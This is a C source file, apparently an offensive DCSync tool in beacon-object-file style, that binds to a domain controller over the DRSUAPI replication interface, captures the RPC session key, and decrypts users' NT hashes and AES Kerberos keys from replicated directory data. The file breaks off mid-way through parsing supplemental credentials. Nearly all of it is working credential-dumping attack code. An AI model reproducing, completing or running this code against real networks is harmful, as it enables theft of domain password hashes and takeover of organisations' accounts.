#pragma once
#pragma comment(lib, "ntdsapi.lib")
#include <string.h>
#define SECURITY_WIN32

#include "dcsync.h"

#include "drsr/ms-drsr.h"
#include <stdio.h>

#include <DsGetDC.h>
#include <wchar.h>
#include <windows.h>

#include <lmcons.h>

#include <LMAPIbuf.h>
#include <NTSecAPI.h>
#include <rpcdcep.h>
#include <sspi.h>

#include <combaseapi.h>
#include <ole2.h>

#include <ntdsapi.h>

#include <DsGetDC.h>

#include <winldap.h>

#include <winber.h>

#include <secext.h>

#include <securitybaseapi.h>

#define MSVCRT$memcpy memcpy
#define RPCRT4$I_RpcBindingInqSecurityContext I_RpcBindingInqSecurityContext
#define RPCRT4$UuidCreate UuidCreate
#define MSVCRT$malloc malloc
#define MSVCRT$memset memset
#define MSVCRT$free free
#define RPCRT4$RpcStringBindingComposeA RpcStringBindingComposeA
#define RPCRT4$RpcBindingFromStringBindingA RpcBindingFromStringBindingA
#define RPCRT4$RpcStringFreeA RpcStringFreeA
#define RPCRT4$RpcBindingSetAuthInfoA RpcBindingSetAuthInfoA
#define RPCRT4$RpcBindingFree RpcBindingFree
#define RPCRT4$RpcBindingSetOption RpcBindingSetOption
#define KERNEL32Sleep Sleep
#define KERNEL32$MultiByteToWideChar MultiByteToWideChar
#define MSVCRT$strlen strlen
#define MSVCRT$_snprintf snprintf
#define MSVCRT$strcat strcat
#define MSVCRT$strstr strstr
#define ADVAPI32$CryptAcquireContextA CryptAcquireContextA
#define ADVAPI32$CryptCreateHash CryptCreateHash
#define ADVAPI32$CryptReleaseContext CryptReleaseContext
#define ADVAPI32$CryptHashData CryptHashData
#define ADVAPI32$CryptDeriveKey CryptDeriveKey
#define ADVAPI32$CryptDecrypt CryptDecrypt
#define ADVAPI32$CryptDestroyKey CryptDestroyKey
#define ADVAPI32$CryptDestroyHash CryptDestroyHash
#define ADVAPI32$CryptGetHashParam CryptGetHashParam
#define ADVAPI32$CryptImportKey CryptImportKey

void BytesToHex(const BYTE *bytes, DWORD len, char *output) {
  const char *hexChars = "0123456789abcdef";
  for (DWORD i = 0; i < len; i++) {
    output[i * 2] = hexChars[(bytes[i] >> 4) & 0xF];
    output[i * 2 + 1] = hexChars[bytes[i] & 0xF];
  }
  output[len * 2] = '\0';
}

DWORD HexToBinary(const BYTE *hexData, DWORD hexLen, BYTE *binaryOut) {
  if (!hexData || !binaryOut || hexLen < 2)
    return 0;

  DWORD binaryLen = 0;
  for (DWORD i = 0; i + 1 < hexLen; i += 2) {
    BYTE high = hexData[i];
    BYTE low = hexData[i + 1];

    // Convert ASCII hex char to nibble
    BYTE highNibble, lowNibble;

    if (high >= '0' && high <= '9')
      highNibble = high - '0';
    else if (high >= 'a' && high <= 'f')
      highNibble = high - 'a' + 10;
    else if (high >= 'A' && high <= 'F')
      highNibble = high - 'A' + 10;
    else
      break; // Invalid hex char

    if (low >= '0' && low <= '9')
      lowNibble = low - '0';
    else if (low >= 'a' && low <= 'f')
      lowNibble = low - 'a' + 10;
    else if (low >= 'A' && low <= 'F')
      lowNibble = low - 'A' + 10;
    else
      break; // Invalid hex char

    binaryOut[binaryLen++] = (highNibble << 4) | lowNibble;
  }

  return binaryLen;
}

BOOL DecryptDESWithRid(const BYTE *encData, DWORD rid, BYTE *output) {
  if (!encData || !output)
    return FALSE;

  HMODULE advapi32 = LoadLibraryA("Advapi32.dll");
  if (!advapi32)
    return FALSE;

  SystemFunction025_t SystemFunction025 =
      (SystemFunction025_t)GetProcAddress(advapi32, "SystemFunction025");
  if (!SystemFunction025) {
    FreeLibrary(advapi32);
    return FALSE;
  }

  NTSTATUS status = SystemFunction025(encData, &rid, output);

  FreeLibrary(advapi32);
  return status == 0; // STATUS_SUCCESS
}

// BOOL DecryptDESWithRid(const BYTE *encData, DWORD rid, BYTE *output) {
//   HMODULE advapi32 = LoadLibraryA("Advapi32.dll");
//   SystemFunction025_t SystemFunction025 =
//       (SystemFunction025_t)GetProcAddress(advapi32, "SystemFunction025");
//
//   return encData && output && RtlDecryptMemory(encData, &rid, output) == 0;
// }

static GUID domainGUID;

static BYTE g_SessionKeyCopy[256] = {0};
static DWORD g_SessionKeyCopyLen = 0;
static volatile LONG g_SessionKeyCapturing = 0;

void RPC_ENTRY RpcSecurityCallback(void *Context) {
  // Atomic check-and-set: only one thread can pass this
  if (InterlockedCompareExchange(&g_SessionKeyCapturing, 1, 0) != 0) {
    return; // Another thread is already capturing or has captured
  }

  PCtxtHandle pSecurityContext = NULL;
  SecPkgContext_SessionKey sessionKey = {0, NULL};

  if (RPCRT4$I_RpcBindingInqSecurityContext(
          Context, (void **)&pSecurityContext) != RPC_S_OK ||
      !pSecurityContext) {
    return;
  }

  if (QueryContextAttributesA(pSecurityContext, SECPKG_ATTR_SESSION_KEY,
                              &sessionKey) == SEC_E_OK &&
      sessionKey.SessionKeyLength > 0 && sessionKey.SessionKeyLength <= 256 &&
      sessionKey.SessionKey) {

    // Copy session key to static buffer
    MSVCRT$memcpy(g_SessionKeyCopy, sessionKey.SessionKey,
                  sessionKey.SessionKeyLength);
    g_SessionKeyCopyLen = sessionKey.SessionKeyLength;

    FreeContextBuffer(sessionKey.SessionKey);
  }
}

BOOL getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR *fullDCName) {
  BOOL status = FALSE;
  DWORD ret;
  PDOMAIN_CONTROLLER_INFOW cInfo = NULL;

  if (!fullDCName)
    return FALSE; // sanity check

  *fullDCName = NULL; // initialize to NULL

  ret = DsGetDcNameW(NULL, fullDomainName, NULL, NULL,
                     altFlags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
  if (ret == ERROR_SUCCESS) {
    // Skip the leading "\\"
    LPCWSTR dcNameSrc = cInfo->DomainControllerName + 2;

    size_t len = wcslen(dcNameSrc) + 1; // include null terminator
    *fullDCName = (LPWSTR)LocalAlloc(LPTR, len * sizeof(wchar_t));
    if (*fullDCName) {
      wcscpy_s(*fullDCName, len, dcNameSrc);
      status = TRUE;
    } else {
      wprintf(L"Memory allocation failed.\n");
    }

    NetApiBufferFree(cInfo);
  } else {
    wprintf(L"DsGetDcName failed: %u\n", ret);
  }

  return status;
}

DRS_HANDLE BindToDRS(RPC_BINDING_HANDLE rpcBinding) {
  DRS_HANDLE drsHandle = NULL;
  DRS_EXTENSIONS_INT *extClient = NULL;
  DRS_EXTENSIONS *extServer = NULL;
  UUID clientDsaUuid;
  ULONG result;

  // Generate a random client DSA UUID
  RPCRT4$UuidCreate(&clientDsaUuid);

  // Create DRS_EXTENSIONS_INT structure like mimikatz
  extClient = (DRS_EXTENSIONS_INT *)MSVCRT$malloc(sizeof(DRS_EXTENSIONS_INT));
  if (!extClient) {
    return NULL;
  }
  MSVCRT$memset(extClient, 0, sizeof(DRS_EXTENSIONS_INT));

  extClient->cb = sizeof(DRS_EXTENSIONS);
  extClient->dwFlags = 0x1FFFFFFF; // All modern capabilities
  extClient->Pid = 0;
  extClient->dwReplEpoch = 0;

  // Call IDL_DRSBind - using the Microsoft RPC stub
  result = IDL_DRSBind(rpcBinding, &clientDsaUuid, (DRS_EXTENSIONS *)extClient,
                       &extServer, &drsHandle);

  MSVCRT$free(extClient);
  MSVCRT$free(extServer);

  if (result != 0) {
    wprintf(L"[-] DRSBind failed: 0x%x\n", result);
    return NULL;
  }

  return drsHandle;
}

RPC_BINDING_HANDLE CreateDRSBinding(const char *dcHostname) {
  RPC_BINDING_HANDLE binding = NULL;
  unsigned char *stringBinding = NULL;
  RPC_STATUS status;

  // Build RPC string binding for DRSUAPI
  // Format: ncacn_ip_tcp:hostname[endpoint]
  status = RPCRT4$RpcStringBindingComposeA(
      NULL,                            // Object UUID
      (unsigned char *)"ncacn_ip_tcp", // Protocol sequence
      (unsigned char *)dcHostname,     // Network address
      NULL,                            // Use dynamic endpoint
      NULL,                            // No options
      &stringBinding);

  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to compose RPC string binding: 0x%x", status);
    return NULL;
  }

  // Create binding handle
  status = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &binding);
  RPCRT4$RpcStringFreeA(&stringBinding);

  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to create RPC binding: 0x%x", status);
    return NULL;
  }

  // Set authentication info (use Kerberos/NTLM via NEGOTIATE)
  // Use NULL for SPN to let RPC determine the correct service principal
  status = RPCRT4$RpcBindingSetAuthInfoA(binding,
                                         NULL, // Let RPC determine SPN
                                         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                         RPC_C_AUTHN_GSS_NEGOTIATE,
                                         NULL, // Use current credentials
                                         RPC_C_AUTHZ_NAME);

  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to set RPC auth info: 0x%x", status);
    RPCRT4$RpcBindingFree(&binding);
    return NULL;
  }

  // Register security callback to capture session key during authentication
  status = RPCRT4$RpcBindingSetOption(binding, RPC_C_OPT_SECURITY_CALLBACK,
                                      (ULONG_PTR)RpcSecurityCallback);
  if (status != RPC_S_OK) {
    wprintf(L"[-] Failed to set security callback: 0x%x", status);
    RPCRT4$RpcBindingFree(&binding);
    return NULL;
  }

  return binding;
}

void InitDRSRequest(DRS_MSG_GETCHGREQ *request, const GUID *dcGuid,
                    DSNAME *targetDsname) {
  if (!request) {
    // printf("no request found..\n");
    return;
  }

  MSVCRT$memset(request, 0, sizeof(DRS_MSG_GETCHGREQ));

  if (dcGuid) {
    // printf("copying GUID\n");
    MSVCRT$memcpy(&request->V8.uuidDsaObjDest, dcGuid, sizeof(GUID));
    // printf("copied GUID\n");
  }

  request->V8.pNC = targetDsname;
  MSVCRT$memset(&request->V8.uuidInvocIdSrc, 0, sizeof(UUID));
  MSVCRT$memset(&request->V8.usnvecFrom, 0, sizeof(USN_VECTOR));
  request->V8.pUpToDateVecDest = NULL;
  request->V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED |
                        DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
  // Maybe DRS_SPECIAL_SECRET_PROCESSING?
  request->V8.cMaxObjects = 1;
  request->V8.cMaxBytes = 0xA00000;
  request->V8.ulExtendedOp = EXOP_REPL_OBJ;
  MSVCRT$memset(&request->V8.liFsmoInfo, 0, sizeof(ULARGE_INTEGER));
  request->V8.pPartialAttrSet = NULL;
  request->V8.pPartialAttrSetEx = NULL;
  request->V8.PrefixTableDest.PrefixCount = 0;
  request->V8.PrefixTableDest.pPrefixEntry = NULL;
}

BOOL getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO *pDomainInfo) {
  BOOL status = FALSE;
  LSA_HANDLE hLSA;
  LSA_OBJECT_ATTRIBUTES oaLsa = {0};

  if (0 == LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)) {
    status = LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation,
                                       (PVOID *)pDomainInfo) == 0;
    LsaClose(hLSA);
  }

  return status;
}

wchar_t *CharToWChar(const char *str) {
  if (!str)
    return NULL;
  int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
  if (len == 0)
    return NULL;

  wchar_t *wstr = (wchar_t *)MSVCRT$malloc(len * sizeof(wchar_t));
  if (!wstr)
    return NULL;

  KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
  return wstr;
}

DSNAME *BuildDSName(const char *dn, const GUID *guid) {
  if (!dn)
    return NULL;

  size_t dnLen = MSVCRT$strlen(dn);
  if (dnLen > 4096)
    return NULL; // Sanity check
  wchar_t *wDn = CharToWChar(dn);
  if (!wDn)
    return NULL;

  size_t wDnLen = 0;
  while (wDn[wDnLen] != 0)
    wDnLen++;

  // Calculate structure size properly using FIELD_OFFSET
  // DSNAME has: structLen, SidLen, Guid, Sid (28 bytes), NameLen, StringName[1]
  // We need: base structure + space for (wDnLen) wide chars (StringName[1]
  // already counts for 1) NOTE: structLen should include the null terminator
  DWORD structLen =
      (DWORD)(sizeof(DSNAME) - sizeof(WCHAR) + ((wDnLen + 1) * sizeof(WCHAR)));

  DSNAME *dsname = (DSNAME *)MSVCRT$malloc(structLen);
  if (!dsname) {
    MSVCRT$free(wDn);
    return NULL;
  }

  MSVCRT$memset(dsname, 0, structLen);
  dsname->structLen = structLen;
  dsname->NameLen = (DWORD)wDnLen; // Length WITHOUT null terminator
  dsname->SidLen = 0;              // Not providing SID

  // Copy GUID if provided
  if (guid) {
    MSVCRT$memcpy(&dsname->Guid, guid, sizeof(GUID));
  } else {
    MSVCRT$memset(&dsname->Guid, 0, sizeof(GUID));
  }

  // Copy the wide string DN (including null terminator)
  for (size_t i = 0; i <= wDnLen; i++) { // <= to include null terminator
    dsname->StringName[i] = wDn[i];
  }

  MSVCRT$free(wDn);
  return dsname;
}

BOOL FetchGUID(LPWSTR DCName, GUID *DCGUID) {
  LDAP *pldap = NULL;
  pldap = ldap_initW(DCName,
                     389); // ldap_initW(const PWSTR HostName, ULONG PortNumber)
  if (pldap == NULL) {
    printf("might need to try ldaps?\n");
    pldap = ldap_initW(DCName, 636);
    if (pldap == NULL) {
      printf("failed to get upgraded connection. 0x%lx\n", GetLastError());
      return FALSE;
    }
  }
  ULONG err = ldap_bind_sW(pldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
  if (err != LDAP_SUCCESS) {
    printf("failed to bind: 0x%lx\n", err);
    return FALSE;
  }
  printf("got bind!!!\n");
  PDOMAIN_CONTROLLER_INFOW pDCInfo = NULL;
  DsGetDcNameW(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &pDCInfo);
  LDAPMessage *pResult = NULL;
  WCHAR szDN[1024];
  ULONG ulSize = sizeof(szDN) / sizeof(szDN[0]);
  GetComputerObjectNameW(NameFullyQualifiedDN, szDN, &ulSize);
  wprintf(L"DC DN: %s\n", szDN);
  ULONG ret;
  WCHAR *attrs[] = {L"objectGUID", NULL};
  ret = ldap_search_sW(pldap, szDN, LDAP_SCOPE_SUBTREE, L"(objectClass=*)",
                       attrs, 0, &pResult);
  if (ret != LDAP_SUCCESS) {
    printf("failed: 0x%lx\n", ret);
    return FALSE;
  }
  LDAPMessage *entry = ldap_first_entry(pldap, pResult);
  if (entry) {
    struct berval **guidVals =
        ldap_get_values_lenW(pldap, entry, L"objectGUID");
    if (guidVals && guidVals[0]) {
      memcpy(DCGUID, guidVals[0]->bv_val, sizeof(GUID));
      // Convert to string
      // LPOLESTR guidString;
      // StringFromCLSID(DCGUID, &guidString);
      // wprintf(L"Computer objectGUID: %s\n", guidString);
      return TRUE;
    }
  }

  return TRUE;
}

BOOL FetchObjectBySAM(LPCWSTR SamAccountName, LPWSTR DNBuffer,
                      ULONG DNBufferSize, GUID *ObjectGUID) {
  if (!SamAccountName || !DNBuffer || !ObjectGUID)
    return FALSE;

  // Initialize LDAP
  LDAP *pldap = ldap_initW(NULL, 389); // NULL = current domain
  if (!pldap) {
    printf("Failed ldap_initW on port 389, trying LDAPS 636...\n");
    pldap = ldap_initW(NULL, 636);
    if (!pldap) {
      printf("Failed to initialize LDAP. Error: 0x%lx\n", GetLastError());
      return FALSE;
    }
  }

  ULONG err = ldap_bind_sW(pldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
  if (err != LDAP_SUCCESS) {
    printf("LDAP bind failed: 0x%lx\n", err);
    ldap_unbind(pldap);
    return FALSE;
  }

  // Get default naming context
  PDOMAIN_CONTROLLER_INFOW pDCInfo = NULL;
  if (DsGetDcNameW(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED,
                   &pDCInfo) != ERROR_SUCCESS) {
    printf("DsGetDcNameW failed\n");
    ldap_unbind(pldap);
    return FALSE;
  }

  // Get the root DN
  LDAPMessage *pRootResult = NULL;
  WCHAR *attrsRoot[] = {L"defaultNamingContext", NULL};
  err = ldap_search_sW(pldap, L"", LDAP_SCOPE_BASE, L"(objectClass=*)",
                       attrsRoot, 0, &pRootResult);
  if (err != LDAP_SUCCESS) {
    printf("Failed to get root naming context: 0x%lx\n", err);
    ldap_unbind(pldap);
    return FALSE;
  }

  LDAPMessage *entry = ldap_first_entry(pldap, pRootResult);
  WCHAR *rootDN = ldap_get_valuesW(pldap, entry, L"defaultNamingContext")[0];
  if (!rootDN) {
    printf("Failed to get root DN\n");
    ldap_msgfree(pRootResult);
    ldap_unbind(pldap);
    return FALSE;
  }

  // Build the filter for SAM account
  WCHAR filter[256];
  swprintf(filter, _countof(filter), L"(sAMAccountName=%s)", SamAccountName);

  WCHAR *attrs[] = {L"distinguishedName", L"objectGUID", NULL};
  LDAPMessage *pResult = NULL;
  err = ldap_search_sW(pldap, rootDN, LDAP_SCOPE_SUBTREE, filter, attrs, 0,
                       &pResult);
  if (err != LDAP_SUCCESS) {
    printf("LDAP search failed: 0x%lx\n", err);
    ldap_msgfree(pRootResult);
    ldap_unbind(pldap);
    return FALSE;
  }

  entry = ldap_first_entry(pldap, pResult);
  if (!entry) {
    printf("Object not found\n");
    ldap_msgfree(pResult);
    ldap_msgfree(pRootResult);
    ldap_unbind(pldap);
    return FALSE;
  }

  // Get DN
  WCHAR **dnVals = ldap_get_valuesW(pldap, entry, L"distinguishedName");
  if (dnVals && dnVals[0]) {
    wcsncpy_s(DNBuffer, DNBufferSize, dnVals[0], _TRUNCATE);
  } else {
    printf("Failed to retrieve DN\n");
    ldap_msgfree(pResult);
    ldap_msgfree(pRootResult);
    ldap_unbind(pldap);
    return FALSE;
  }

  // Get GUID
  struct berval **guidVals = ldap_get_values_lenW(pldap, entry, L"objectGUID");
  if (guidVals && guidVals[0]) {
    memcpy(ObjectGUID, guidVals[0]->bv_val, sizeof(GUID));
  } else {
    printf("Failed to retrieve GUID\n");
    ldap_msgfree(pResult);
    ldap_msgfree(pRootResult);
    ldap_unbind(pldap);
    return FALSE;
  }

  ldap_msgfree(pResult);
  ldap_msgfree(pRootResult);
  ldap_unbind(pldap);

  return TRUE;
}

// parsing creds type shit
DWORD GetRIDFromSID(const BYTE *sid, DWORD sidLen) {
  if (!sid || sidLen < 12)
    return 0;

  // SID structure: Revision (1) + SubAuthCount (1) + Authority (6) + SubAuths
  // (4 * count) RID is the last SubAuth value
  BYTE subAuthCount = sid[1];
  if (sidLen < (8 + (subAuthCount * 4)))
    return 0;

  DWORD offset = 8 + ((subAuthCount - 1) * 4);
  DWORD rid = *(DWORD *)(sid + offset);

  return rid;
}

BOOL DecryptRC4(const BYTE *encData, DWORD encLen, const BYTE *rid,
                BYTE *output) {
  HCRYPTPROV hProv = 0;
  HCRYPTHASH hHash = 0;
  HCRYPTKEY hKey = 0;
  BOOL success = FALSE;

  if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES,
                                     CRYPT_VERIFYCONTEXT)) {
    return FALSE;
  }

  if (!ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
    ADVAPI32$CryptReleaseContext(hProv, 0);
    return FALSE;
  }

  if (!CryptHashData(hHash, rid, 4, 0)) {
    goto cleanup;
  }

  if (!ADVAPI32$CryptDeriveKey(hProv, CALG_RC4, hHash, 0, &hKey)) {
    goto cleanup;
  }

  MSVCRT$memcpy(output, encData, encLen);

  DWORD dataLen = encLen;
  if (ADVAPI32$CryptDecrypt(hKey, 0, TRUE, 0, output, &dataLen)) {
    success = TRUE;
  }

cleanup:
  if (hKey)
    ADVAPI32$CryptDestroyKey(hKey);
  if (hHash)
    ADVAPI32$CryptDestroyHash(hHash);
  if (hProv)
    ADVAPI32$CryptReleaseContext(hProv, 0);

  return success;
}

BOOL DecryptRC4WithRawKey(const BYTE *encData, DWORD encLen, const BYTE *key,
                          DWORD keyLen, BYTE *output) {
  HCRYPTPROV hProv = 0;
  HCRYPTKEY hKey = 0;
  BOOL success = FALSE;

  if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES,
                                     CRYPT_VERIFYCONTEXT)) {
    return FALSE;
  }

  struct {
    BLOBHEADER hdr;
    DWORD keySize;
    BYTE keyBytes[16];
  } keyBlob;

  keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
  keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
  keyBlob.hdr.reserved = 0;
  keyBlob.hdr.aiKeyAlg = CALG_RC4;
  keyBlob.keySize = keyLen;
  MSVCRT$memcpy(keyBlob.keyBytes, key, keyLen);

  if (!ADVAPI32$CryptImportKey(hProv, (BYTE *)&keyBlob,
                               sizeof(BLOBHEADER) + sizeof(DWORD) + keyLen, 0,
                               0, &hKey)) {
    ADVAPI32$CryptReleaseContext(hProv, 0);
    return FALSE;
  }

  MSVCRT$memcpy(output, encData, encLen);

  DWORD dataLen = encLen;
  if (ADVAPI32$CryptDecrypt(hKey, 0, TRUE, 0, output, &dataLen)) {
    success = TRUE;
  }

  if (hKey)
    ADVAPI32$CryptDestroyKey(hKey);
  if (hProv)
    ADVAPI32$CryptReleaseContext(hProv, 0);

  return success;
}

BOOL DecryptWithSessionKey(const BYTE *encryptedData, DWORD encryptedLen,
                           const BYTE *sessionKey, DWORD sessionKeyLen,
                           BYTE *output, DWORD *outputLen) {
  if (!encryptedData || !sessionKey || !output || encryptedLen < 20) {
    return FALSE;
  }

  const BYTE *salt = encryptedData;
  const BYTE *encPayload = encryptedData + 16;
  DWORD encPayloadLen = encryptedLen - 16;

  HCRYPTPROV hProv = 0;
  HCRYPTHASH hHash = 0;
  BYTE derivedKey[16];
  DWORD derivedKeyLen = 16;

  if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES,
                                     CRYPT_VERIFYCONTEXT) ||
      !ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
    if (hProv)
      ADVAPI32$CryptReleaseContext(hProv, 0);
    return FALSE;
  }

  ADVAPI32$CryptHashData(hHash, sessionKey, sessionKeyLen, 0);
  ADVAPI32$CryptHashData(hHash, salt, 16, 0);

  if (!ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, derivedKey, &derivedKeyLen,
                                  0)) {
    ADVAPI32$CryptDestroyHash(hHash);
    ADVAPI32$CryptReleaseContext(hProv, 0);
    return FALSE;
  }

  ADVAPI32$CryptDestroyHash(hHash);
  ADVAPI32$CryptReleaseContext(hProv, 0);

  BYTE *tempOutput = (BYTE *)MSVCRT$malloc(encPayloadLen);
  if (!tempOutput) {
    return FALSE;
  }

  BOOL result = DecryptRC4WithRawKey(encPayload, encPayloadLen, derivedKey, 16,
                                     tempOutput);

  if (result && encPayloadLen > 4) {
    DWORD receivedChecksum = *(DWORD *)tempOutput;
    DWORD realDataLen = encPayloadLen - 4;
    BYTE *realData = tempOutput + 4;

    DWORD calculatedChecksum = 0xFFFFFFFF;
    for (DWORD i = 0; i < realDataLen; i++) {
      DWORD byte = realData[i];
      calculatedChecksum = calculatedChecksum ^ byte;
      for (int j = 0; j < 8; j++) {
        DWORD mask = -(calculatedChecksum & 1);
        calculatedChecksum = (calculatedChecksum >> 1) ^ (0xEDB88320 & mask);
      }
    }
    calculatedChecksum = ~calculatedChecksum;

    if (receivedChecksum == calculatedChecksum && outputLen) {
      MSVCRT$memcpy(output, realData, realDataLen);
      *outputLen = realDataLen;
    } else {
      result = FALSE;
    }
  } else {
    result = FALSE;
  }

  MSVCRT$free(tempOutput);
  return result;
}

void ProcessCredentials(REPLENTINFLIST *objects, const char *samAccountName,
                        const char *dcHostname, const BYTE *sessionKey,
                        DWORD sessionKeyLen) {
  if (!objects)
    return;

  char ntHash[33] = {0};
  char lmHash[33] = {0};
  char aes256Key[65] = {0};
  char aes128Key[33] = {0};
  BOOL foundNT = FALSE;
  BOOL foundLM = FALSE;
  BOOL foundAES256 = FALSE;
  BOOL foundAES128 = FALSE;
  DWORD userRID = 0;
  DWORD accountType = SAM_USER_OBJECT; // Default to user account

  // Iterate through returned objects
  REPLENTINFLIST *current = objects;
  while (current) {
    ENTINF *entinf = &current->Entinf;
    ATTRBLOCK *attrBlock = &entinf->AttrBlock;

    // FIRST PASS: Extract RID and account type (needed for decryption and salt
    // construction)
    for (ULONG i = 0; i < attrBlock->attrCount; i++) {
      ATTR *attr = &attrBlock->pAttr[i];
      ATTRTYP attrType = attr->attrTyp;

      if (attrType == ATT_OBJECT_SID && attr->AttrVal.valCount > 0) {
        ATTRVAL *val = &attr->AttrVal.pAVal[0];
        userRID = GetRIDFromSID(val->pVal, val->valLen);
      } else if (attrType == ATT_SAM_ACCOUNT_TYPE &&
                 attr->AttrVal.valCount > 0) {
        ATTRVAL *val = &attr->AttrVal.pAVal[0];
        if (val->valLen == 4) {
          accountType = *(DWORD *)(val->pVal);
        }
      }
    }

    // SECOND PASS: Process all attributes with correct RID
    for (ULONG i = 0; i < attrBlock->attrCount; i++) {
      ATTR *attr = &attrBlock->pAttr[i];
      ATTRTYP attrType = attr->attrTyp;

      // NT hash (unicodePwd) - ATTRTYP should be 0x9005A
      if (attrType == ATT_UNICODE_PWD && attr->AttrVal.valCount > 0) {
        ATTRVAL *val = &attr->AttrVal.pAVal[0];

        // Modern AD uses encrypted blob format with structure:
        // For 36 bytes: [4 byte header] + [16 byte salt] + [16 byte encrypted
        // hash] For 20 bytes: [4 byte header] + [16 byte encrypted hash] For 16
        // bytes: [16 byte encrypted hash] (simple RC4)

        if (val->valLen == 16) {
          BYTE decrypted[16];
          BYTE ridBytes[4];
          *(DWORD *)ridBytes = userRID;

          if (DecryptRC4(val->pVal, 16, ridBytes, decrypted)) {
            BytesToHex(decrypted, 16, ntHash);
            foundNT = TRUE;
          }
        } else if (val->valLen == 20) {
          BYTE decrypted[16];
          BYTE ridBytes[4];
          *(DWORD *)ridBytes = userRID;

          if (DecryptRC4(val->pVal + 4, 16, ridBytes, decrypted)) {
            BytesToHex(decrypted, 16, ntHash);
            foundNT = TRUE;
          }
        } else if (val->valLen == 36 || val->valLen == 40) {
          BYTE decrypted[32];
          BOOL decryptSuccess = FALSE;
          BYTE ridBytes[4];
          *(DWORD *)ridBytes = userRID;

          if (sessionKey && sessionKeyLen > 0) {
            DWORD outputLen = 0;
            BYTE sessionDecrypted[32];
            if (DecryptWithSessionKey(val->pVal, val->valLen, sessionKey,
                                      sessionKeyLen, sessionDecrypted,
                                      &outputLen)) {
              if (outputLen >= 16) {
                BYTE ridDecrypted[16];
                if (DecryptDESWithRid(sessionDecrypted, userRID,
                                      ridDecrypted)) {
                  MSVCRT$memcpy(decrypted, ridDecrypted, 16);
                  BytesToHex(decrypted, 16, ntHash);
                  foundNT = TRUE;
                  decryptSuccess = TRUE;
                }
              }
            }
          }

          if (!decryptSuccess) {
            BYTE ridDecrypted[16];
            if (DecryptRC4(val->pVal + 20, 16, ridBytes, ridDecrypted) &&
                ridDecrypted[0] != 0 && ridDecrypted[0] != 0xFF) {
              BytesToHex(ridDecrypted, 16, ntHash);
              foundNT = TRUE;
              decryptSuccess = TRUE;
            }
          }

          if (!decryptSuccess) {
            BYTE ridDecrypted[16];
            if (DecryptRC4(val->pVal + 4, 16, ridBytes, ridDecrypted) &&
                ridDecrypted[0] != 0 && ridDecrypted[0] != 0xFF) {
              BytesToHex(ridDecrypted, 16, ntHash);
              foundNT = TRUE;
              decryptSuccess = TRUE;
            }
          }

          if (!decryptSuccess &&
              DecryptRC4(val->pVal, 16, ridBytes, decrypted) &&
              decrypted[0] != 0 && decrypted[0] != 0xFF) {
            BytesToHex(decrypted, 16, ntHash);
            foundNT = TRUE;
            decryptSuccess = TRUE;
          }
        }
      }

      if (attrType == 0x9007D && attr->AttrVal.valCount > 0) {
        ATTRVAL *val = &attr->AttrVal.pAVal[0];
        if (val->valLen > 65536)
          continue; // Sanity check
        BYTE *decrypted = (BYTE *)MSVCRT$malloc(val->valLen);
        if (!decrypted)
          continue;
        {
          BYTE ridBytes[4];
          *(DWORD *)ridBytes = userRID;

          BOOL decryptSuccess = FALSE;

          if (sessionKey && sessionKeyLen > 0 && val->valLen > 108) {
            DWORD sessionDecryptedLen = 0;
            BYTE *sessionDecrypted = (BYTE *)MSVCRT$malloc(val->valLen);
            if (!sessionDecrypted) {
              MSVCRT$free(decrypted);
              continue;
            }

            if (DecryptWithSessionKey(val->pVal, val->valLen, sessionKey,
                                      sessionKeyLen, sessionDecrypted,
                                      &sessionDecryptedLen)) {
              MSVCRT$memcpy(decrypted, sessionDecrypted, sessionDecryptedLen);
              decryptSuccess = TRUE;
            }

            if (sessionDecrypted)
              MSVCRT$free(sessionDecrypted);
          }

          if (!decryptSuccess) {
            if (DecryptRC4(val->pVal, val->valLen, ridBytes, decrypted)) {
              decryptSuccess = TRUE;
            }
          }

          if (decryptSuccess) {
            // USER_PROPERTIES structure:
            // typedef struct _USER_PROPERTIES {
            //   DWORD Reserved1;         // offset 0 (4 bytes) - should be 0
            //   DWORD Length;            // offset 4 (4 bytes) - length of
            //   UserProperties data WORD Reserved2;          // offset 8 (2
            //   bytes) WORD Reserved3;          // offset 10 (2 bytes) BYTE
            //   Reserved4[96];      // offset 12-107 (96 bytes) BYTE
            //   UserProperties[1];  // offset 108+
            // } USER_PROPERTIES;

            if (val->valLen < 108) {
              printf("[!] Buffer too small for USER_PROPERTIES");
              MSVCRT$free(decrypted);
              continue;
            }

            DWORD *pLength = (DWORD *)(decrypted + 4);
            BYTE *propertyData = decrypted + 108;
            DWORD propertyLen = val->valLen - 108;

            if (*pLength > 0 && *pLength <= (val->valLen - 108)) {
              propertyLen = *pLength;
            }

            for (DWORD i = 0; i < propertyLen - 40; i++) {
              if (propertyData[i] == 'P' && propertyData[i + 1] == 0x00 &&
                  propertyData[i + 2] == 'r' && propertyData[i + 3] == 0x00 &&
